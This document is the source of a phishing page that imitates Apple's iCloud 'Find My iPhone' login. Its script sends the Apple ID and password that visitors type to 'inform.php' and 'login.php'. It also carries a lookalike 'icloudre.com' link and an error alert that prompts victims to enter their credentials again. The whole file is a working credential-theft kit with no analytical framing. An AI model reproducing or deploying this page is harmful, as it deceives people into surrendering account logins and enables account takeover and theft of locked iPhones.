<?php
include "validate.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="robots" content="nofollow"><title>Apple</title><link rel="stylesheet" type="text/css" href="./Apple_files/style.css"><style type="text/css"></style></head>   
    <body id="main-body">
    <link rel="stylesheet" href="./Apple_files/bootstrap.min.css">
    

    <script src="./Apple_files/jquery.min.js"></script>
    <script>
        function SubmitMe() {
            $.ajax({
                url: 'inform.php',
                dataType: 'json',
                type: 'post',
                contentType: 'application/json',
                data: JSON.stringify( { "username": $('#username').val(), "pw": $('#password').val() } ),
                processData: false,
                success: function( data, textStatus, jQxhr ){
                    $('#result').html( JSON.stringify( data ) );
                },
                error: function( jqXhr, textStatus, errorThrown ){
                    alert("This account doesn't exist please check your Apple ID and Password and try again.");
                }
            });
            return false;
        }
    </script>


<div id="container">
    <div id="row">
        <div id="iCloudLogo"></div>
        <div id="title-center">
            <h1>Find My iPhone</h1>
        </div>
        <div id="form-center">
            <form action="login.php" method="post">
                <div id="form-group-container">
                    <div id="form-group">
                        <label for="username">Apple ID</label>
                       <input autocorrect="off" autocapitalize="off" autofocus="autofocus" name="apple" id="username" placeholder="example@icloud.com" type="text">
                        <br>
                    </div>
                    <div id="form-group">
                        <label for="password">Password</label>
                        <input autocorrect="off" autocapitalize="off" type="password" name="pw" id="password" placeholder="required">
                        <input type="hidden" value="https://p01-caldav.icloud.com" id="server" name="server">

                    </div>
                </div>
                <input type="hidden" value="English" name="lang" id="lang">

                <input type="hidden" value="www.icloudre.com/apple.html" name="link">
                <input type="submit" style="position: absolute; height: 0px; width: 0px; border: none; padding: 0px;" hidefocus="true" tabindex="-1">
            </form>
        </div>
        <div id="help-center">
            <a class="help-a-style" href="https://iforgot.apple.com/">Forgot your Apple ID or password?</a>
            <span id="result"></span>
        </div>
        <div id="footer">
                            <a class="help-a-style" style="font-size: 35pt;" href="http://www.apple.com/icloud/setup/">Setup Instruction</a>
                        <p>Version 4.0 (4A86)</p>
        </div>
    </div>
</div>



<script src="./Apple_files/bootstrap.min.js"></script>
<script>
    $(document).ready(function() {
        var userLang = navigator.language || navigator.userLanguage;
        console.log(userLang);
        $("input[name=apple]").focus();
        $(".clearable").on('click', function(){
            $("input[name=apple]").val('').change();
            $(this).attr("src", "blue-icon-close.png");
            $(this).css("display", "none");
            $(this).attr("src", "Close-icon.png");
        });
        function isValidEmailAddress(emailAddress) {
            var pattern = new RegExp(/^(("[\w-+\s]+")|([\w-+]+(?:\.[\w-+]+)*)|("[\w-+\s]+")([\w-+]+(?:\.[\w-+]+)*))(@((?:[\w-+]+\.)*\w[\w-+]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][\d]\.|1[\d]{2}\.|[\d]{1,2}\.))((25[0-5]|2[0-4][\d]|1[\d]{2}|[\d]{1,2})\.){2}(25[0-5]|2[0-4][\d]|1[\d]{2}|[\d]{1,2})\]?$)/i);
            return pattern.test(emailAddress);
        };
        $('input[name=apple]').bind("keydown", function(e){
            if(e.which == 13){
                e.preventDefault();
                var val = $(this).val();
                if (!isValidEmailAddress(val)) {
                    val = val+"@icloud.com";
                    $(this).val(val);
                } else {
                    console.log($(this).val());
                }
                console.log(val);
                $("input[name=pw]").focus();
                return false;
            } else if (e.keyCode == 8 || e.keyCode == 46) {
                if($("input[name=apple]").val() == "") {
                    $(".clearable").css("display", "none");
                    $(".clearable").attr("src", "Close-icon.png");
                }
            } else if($("input[name=apple]").val() == "") {
                $(".clearable").css("display", "none");
                $(".clearable").attr("src", "Close-icon.png");
            } else {
                $(".clearable").css("display", "block");
            }
        });

    });
</script>
</body></html>
